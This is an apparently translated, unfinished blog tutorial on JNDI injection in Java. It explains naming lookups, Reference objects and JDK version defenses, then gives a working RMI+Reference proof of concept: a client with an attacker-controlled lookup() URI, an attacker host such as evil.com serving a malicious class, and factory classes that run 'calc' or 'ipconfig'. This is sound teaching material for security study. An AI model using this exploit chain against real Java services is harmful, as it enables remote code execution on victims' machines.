---
layout: post
author: L3moon龙
tags: [java, JNDI Injection]
---
# Analysis of JNDI injection in Java 
## 0x01 Basic Concept 
### What is JNDI 
- The full name of JNDI is Java Naming and DirectoryInterface (Java Naming and Directory Interface), which is a set of application program interfaces that provide developers with a unified general interface for finding and accessing various resources, which can be used to define users, networks, machines, objects and services and other resources.

The services supported by JNDI mainly include: DNS, LDAP, CORBA, RMI, etc.
Simply put, JNDI is a set of API interfaces. Each object has a unique set of key-value bindings that bind the name to the object. The specified object can be retrieved by name, and the object may be stored in RMI, LDAP, CORBA, etc.
As shown in the figure: 

![image](https://cdn.educba.com/academy/wp-content/uploads/2019/11/Architecture.png)

#### Java Naming
A naming service is a binding of key-value pairs that enables applications to retrieve values ​​by key.
#### Java Directory
Directory services are a natural extension of naming services. The difference between the two is that objects in a directory service can have attributes, while objects in a naming service have no attributes. Therefore, objects can be searched based on attributes in the directory service.

- JNDI allows you to access files in the file system, locate remote RMI-registered objects, access directory services such as LDAP, and locate EJB components on the network.
ObjectFactory
#### Object Factory 
is used to convert data stored in Naming Service (such as RMI/LDAP) into expressible data in Java, such as objects in Java or basic data types in Java. Each Service Provider may be equipped with multiple Object Factory.
The problem with JNDI injection is in the custom ObjectFactory class that can be downloaded remotely.

#### JNDI Code Example 
Binding and lookup methods are provided in JNDI:
    -bind: bind the name to the object;
    -lookup: object executed by name retrieval;

let's first write a Secret class with secret key and secret value properties:

```java
public class Secret Implements Remote, Serializable {
    private static final long serialVersionUID = 1L; 
    private String key;
    private String value;

    public void setKey(String key) {
        this.key = key;
    }

    public void setValue(String value) {
        this.value = value;
    }

    public String getKey() {
        return key;
    }

    public String getValue() {
        return value;
    }

    public String toString() {
        return "key: " + key + " value: " + value;
    } 
}
```
server.java actually represents the server side and the client side together.
the first part is the initSecret() method which the srver that implements the RMI service throught the JNDI and binds the instantiated secret object to the RMI service through the JNDI bind() method.
the second part is the client part which will be represented via the findsecret() method which will use the JNDI lookup() method to find the secret object and print the secret object.

```java
public class Server {
    public static void main(String[] args) {
        try {
            initSecret();
            findSecret();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void initSecret() throws Exception {
        // create a secret object
        Secret secret = new Secret();
        secret.setKey("secretKey");
        secret.setValue("secretValue");

        // create a JNDI initial context
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);

        // bind the secret object to the RMI service
        ctx.bind("rmi://localhost:1099/SecretObj", secret);
    }

    public static void findSecret() throws Exception {
        // create a JNDI initial context
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);

        // lookup the secret object
        Secret secret = (Secret) ctx.lookup("rmi://localhost:1099/SecretObj");
        System.out.println(secret);
    }
}
```

That's not the only possible implementation of JNDI, there are other implementations such as LDAP, CORBA, etc. and the implementation of JNDI is not limited to RMI, it can also be implemented through other protocols such as HTTP, etc. 

this an example of jndi implementation through http protocol: 

 ```java
public class Server {
    public static void main(String[] args) {
        try {
            initSecret();
            findSecret();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void initSecret() throws Exception {
        // create a secret object
        Secret secret = new Secret();
        secret.setKey("secretKey");
        secret.setValue("secretValue");

        // create a JNDI initial context
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.url.http.HttpURLContextFactory");
        env.put(Context.PROVIDER_URL, "http://localhost:8080");
        Context ctx = new InitialContext(env);

        // bind the secret object to the RMI service
        ctx.bind("http://localhost:8080/SecretObj", secret);
    }

    public static void findSecret() throws Exception {
        // create a JNDI initial context
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.url.http.HttpURLContextFactory");
        env.put(Context.PROVIDER_URL, "http://localhost:8080");
        Context ctx = new InitialContext(env);

        // lookup the secret object
        Secret secret = (Secret) ctx.lookup("http://localhost:8080/SecretObj");
        System.out.println(secret);
    }

} 

```
Note : 
    Server: when initializing and configuring JNDI settings, you need to pre-specify its context environment, such as specifying it as an RMI service, and finally call javax.naming.InitialContext.bind() to bind the specified object. to the RMI registry;

#### Reference class

- The Reference class represents a reference to an object that exists outside the naming/directory system.

In order to store Object objects in the Naming or Directory service, Java provides the Naming Reference function. Objects can be stored in the Naming or Directory service by binding the Reference, such as RMI, LDAP, etc.
When using Reference, we can directly write the object in the constructor, and when it is called, the method of the object will be triggered.
Several key attributes: 

    className: The class name used for remote loading; 

    classFactory: The name of the class to be instantiated in the loaded class;

    classFactoryLocation: The address of the remote loaded class, the address for providing classes data can be a protocol such as file/ftp/http;

#### Java Security Manager 

- Objects in Java are divided into local objects and remote objects. Local objects are trusted by default, but remote objects are not trusted. For example, when our system loads an object from a remote server, for the sake of security, the JVM will limit the ability of the object, such as prohibiting the object from accessing our local file system, etc. These rely on the security manager in the existing JVM (SecurityManager) to achieve. 

![image](https://docs.oracle.com/en/java/javase/12/security/img/jssec_dt_030_anc4.png)

#### Security Manager for JNDI  
This part will also be discussed in detail later in bypassing the restrictions of higher versions of JDK. i need you to concentrate 

so to load remote objects, JDNI has two different security control methods. For Naming Manager, the rules of the relative security manager are relatively broad, but the JNDI SPI layer will be controlled according to the rules in the following table: 
![image](https://img-blog.csdn.net/20160825165548350?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

#### JNDI protocol dynamic conversion 
in the RMI service implemented by JNDI, the context environment (RMI, LDAP, CORBA, etc.) can be pre-specified when initializing and configuring the JNDI settings. Here are the two previous writing methods: 
```java
    Hashtable<String, String> env = new Has htable<String, String>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    Context ctx = new InitialContext(env);
    ```
```java
    Hashtable<String, String> env = new Hashtable<String, String>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.url.http.HttpURLContextFactory");
    env.put(Context.PROVIDER_URL, "http://localhost:8080");
    Context ctx = new InitialContext(env);
```
However, when calling lookup() or search(), you can use the dynamic conversion context with URI. For example, if the current context has been set above to access the RMI service, you can directly use the LDAP URI format to convert the context to access the LDAP service. The binding object instead of the original RMI service:
```java
    // lookup the secret object
    Secret secret = (Secret) ctx.lookup("ldap://localhost:389/SecretObj");
    System.out.println(secret);
```

and this is what's going on in the background:
```java
    protected  Context  getURLOrDefaultInitCtx (Name paramName)  throws  NamingException  { 
    if  (NamingManager.hasInitialContextFactoryBuilder()) { 
        return  getDefaultInitCtx();  
    } 
    if  (paramName.size() >  0 ) { 
        String str1 = paramName.get( 0 ); 
        String str2 = getURLScheme(str1);  // try to parse the protocol in the URI 
        if  (str2 !=  null ) { 
            // If there is a Schema protocol, try to get its corresponding context 
            Context localContext = NamingManager.getURLContext(str2,  this .myProps); 
            if  (localContext !=  null ) {  
                return  localContext; 
            } 
        }   
    } 
    return  getDefaultInitCtx(); 
} 
```
The above code is the implementation of the getURLOrDefaultInitCtx() method in the InitialContext class. When the lookup() method is called, the getURLOrDefaultInitCtx() method is called to get the context. If the URI contains a protocol, the corresponding context will be obtained. If not, the default context will be obtained.

## 0x02 JNDI injection

### Prerequisites & JDK Defense

In order to successfully exploit the JNDI injection vulnerability, an important prerequisite is the JDK version of the current Java environment, and the different attack vectors in JNDI injection and the restricted version numbers of the exploitation methods are a little different.

Here are the defenses of all different versions of the JDK listed:

    After JDK 6u45, 7u21: The default value of java.rmi.server.useCodebaseOnly is set to true. When the value is true, automatic loading of remote class files is disabled, and class files are loaded only from the CLASSPATH and the path specified by the current JVM's java.rmi.server.codebase. Using this property prevents the client VM from dynamically loading classes from other Codebase addresses, increasing the security of the RMI ClassLoader.

    After JDK 6u141, 7u131, 8u121: Added the option com.sun.jndi.rmi.object.trustURLCodebase, the default is false, which prohibits RMI and CORBA protocols from using the remote codebase option, so RMI and CORBA are no longer available on the above JDK versions. This vulnerability is triggered, but JNDI injection attacks can still be performed by specifying the URI as the LDAP protocol.

    After JDK 6u211, 7u201, and 8u191: the option com.sun.jndi.ldap.object.trustURLCodebase has been added. The default value is false, which prohibits the LDAP protocol from using the remote codebase option, and also prohibits the attack method of the LDAP protocol.

Therefore, before we perform JNDI injection, we must know the prerequisite of the JDK version of the current environment. Only the JDK version within the available range can satisfy the prerequisite for our JNDI injection

### RMI attack vector
### RMI+Reference Utilization Skills 
JNDI provides a Reference class to represent a reference to an object, which contains the class information and address of the referenced object. 

Because in JNDI, object transfer is either stored by serialization (copy of object, corresponding to pass by value) or by reference (reference of object, corresponding to pass by reference). When serialization is not easy to use, We can use Reference to store objects in the JNDI system. 
so inorder to exploit the JNDI injection vulnerability we need to : 
- bind the malicious Reference class in the RMI registry, where the malicious reference points to the remote malicious class file, when the user can control it outside the lookup() function parameter of the JNDI client or outside the classFactoryLocation parameter of the Reference class constructor. When the control is performed, the user's JNDI client will access the malicious Reference class bound in the RMI registry, thereby loading the malicious class file on the remote server and executing it locally on the client, finally realizing the JNDI injection attack and leading to remote code execution . 

Let's look at an example, taking the external controllable parameters of the lookup() function as an example, the attack principle is as follows: 

![jndi](/home/Downloads/6.png)

    1 - The attacker triggers dynamic envi  ronment conversion through controllable URI parameters, for example, the URI here is rmi://evil.com:1099/refObj；
    2 - The previously configured context rmi://localhost:1099will be pointed to due to dynamic context conversion rmi://evil.com:1099/；
    3 - apply to go rmi://evil.com:1099request binding object refObj, the RMI service prepared by the attacker in advance will return with the name refObjThe ReferenceWrapper object you want to bind ( Reference("EvilObject", "EvilObject", "http://evil-cb.com/")）；
    4 - App gets ReferenceWrapperobject starts from local CLASSPATHsearch in EvilObjectclass, if it does not exist it will be retrieved from http://evil-cb.com/go up and try to get EvilObject.class, that is, to dynamically acquire http://evil-cb.com/EvilObject.class；
    5 - The attacker's pre-prepared service returns a compiled file containing malicious code. EvilObject.class；
    6 - The application starts calling EvilObjectThe constructor of the class, because the attacker defines the constructor in advance, the malicious code contained in it is executed;


The code is as follows. Of course, you need to pay attention to the impact of the JDK version.
JNDIClient.java, lookup() function parameters are externally controllable: 

```java
public  class  JNDIClient  { 
    public  static  void  main (String[] args)  throws  Exception  { 
        if (args.length <  1 ) { 
            System.out.println( "Usage: java JNDIClient <uri>" ); 
            System.exit(- 1 ); 
        } 
        String uri = args[ 0 ]; 
        Context ctx =  new  InitialContext(); 
        System.out.println( "Using lookup() to fetch object with "  + uri); 
        ctx.lookup(uri); 
    } 
} 
```
EvilObject.java, the purpose is to play the role of malicious code: 

```java 
public  class  EvilObject  implements  Serializable  { 
    public  EvilObject ()  throws  Exception  { 
        System.out.println( "EvilObject constructor called" ); 
        Runtime.getRuntime().exec( "calc" ); 
    } 
} 
```
RMIService.java, if the object instance can be successfully bound to the RMI service, it must directly or indirectly implement the Remote interface. Here, ReferenceWrapper inherits from the UnicastRemoteObject class and implements the Remote interface:   
```java
public  class  RMIService  { 
    public  static  void  main (String args[])  throws  Exception  { 
        Registry registry = LocateRegistry.createRegistry( 1099 ); 
        Reference refObj =  new  Reference( "EvilObject" ,  "EvilObject" ,  "http://127.0.0.1:8080/" ); 
        ReferenceWrapper refObjWrapper =  new  ReferenceWrapper(refObj); 
        System.out.println( "Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'" ); 
        registry.bind( "refObj" , refObjWrapper); 
    } 
} 
```

Here, RMIService.java and JNDIClient.java are placed in the same directory, and EvilObject.java is placed in another directory (to prevent the application side from instantiating the EvilObject object during the reappearance of the vulnerability, find the compiled bytes from the current path of the CLASSPATH code, without going to the remote end to download), compile these three files, and execute commands in different windows, and finally successfully implement JNDI injection through RMI+Reference:

![jndi](/home/Downloads/7.png)

> Vulnerability point 1 - lookup parameter injection

When the parameters of the lookup() function of the JNDI client are controllable, that is, the URI is controllable, according to the principle of dynamic conversion of the JNDI protocol, the attacker can pass in a malicious URI address to point to the attacker's RMI registry service, so that the victim client can load A malicious class bound to the attacker's RMI registry service, enabling remote code execution.

The following takes the RMI service as an example. The principle is the same as the previous summary. The local JDK version is 1.8.0_73.

AClient.java is a JNDI client. The original context has been set to connect to the local RMI registry service on port 1099 by default. At the same time, the program allows the user to enter the URI address to dynamically convert the JNDI access address, that is, the lookup() function here. Parameters can be controlled: 

```java
public  class  AClient  { 
    public  static  void  main (String[] args)  throws  Exception  { 
        Properties env =  new  Properties(); 
        env.put(Context.INITIAL_CONTEXT_FACTORY,  "com.sun.jndi.rmi.registry.RegistryContextFactory" ); 
        env.put(Context.PROVIDER_URL,  "rmi://127.0.0.1:1099" ); 
        Context ctx =  new  InitialContext(env); 
        String uri =  "" ; 
        if (args.length ==  1 ) { 
            uri = args[ 0 ]; 
            System.out.println( "[*]Using lookup() to fetch object with "  + uri); 
            ctx.lookup(uri); 
        }  else  { 
            System.out.println( "[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo" ); 
            ctx.lookup( "demo" ); 
        } 
    } 
} 
```
Finally, write a malicious EvilClassFactory class, the goal is to execute the ipconfig command on the client, compile it into a class file and place it in the same directory as AServer: 

```java
public  class  EvilClassFactory  implements  ObjectFactory  { 
    public  Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws  Exception  { 
        Runtime.getRuntime().exec( "ipconfig" ); 
        return  null ; 
    } 
} 
```

>> to be continued ...





